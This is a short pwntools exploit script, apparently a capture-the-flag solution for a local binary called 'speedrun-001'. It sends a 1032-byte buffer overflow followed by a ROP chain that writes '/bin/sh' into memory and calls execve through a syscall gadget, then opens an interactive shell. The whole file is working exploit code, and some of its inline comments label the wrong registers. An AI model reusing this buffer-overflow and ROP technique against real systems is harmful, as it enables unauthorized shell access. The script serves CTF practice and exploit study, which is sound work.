from pwn import *
import time 

context(log_level='debug',os='linux',arch='amd64')
p=process('./speedrun-001')
p.recvline()

pop_rdx_ret=0x4498b5
pop_rax_ret=0x415664
pop_rsi_ret=0x4101f3
pop_rdi_ret=0x400686
mov_raxaddr_rdx_addr=0x48d251 
write_binsh_addr=0x6b6000
binsh=p64(0x0068732f6e69622f)
syscall_address=0x474e65

payload="A"*1032                 # control the return address .
payload+=p64(pop_rdx_ret)        # start to control our registers.
payload+=binsh
payload+=p64(pop_rax_ret)
payload+=p64(write_binsh_addr)
payload+=p64(mov_raxaddr_rdx_addr)
payload+=p64(pop_rdi_ret)        # the pointer to execve the /bin/sh\0x00
payload+=p64(write_binsh_addr)
payload+=p64(pop_rsi_ret)        # let the register of rdi =0 
payload+=p64(0x0)                    
payload+=p64(pop_rdx_ret)        # let the register of rsi =0
payload+=p64(0x0)
payload+=p64(pop_rax_ret)
payload+=p64(0x3b)               # system call (execve)

payload+=p64(syscall_address) 




p.sendline(payload)
p.interactive()
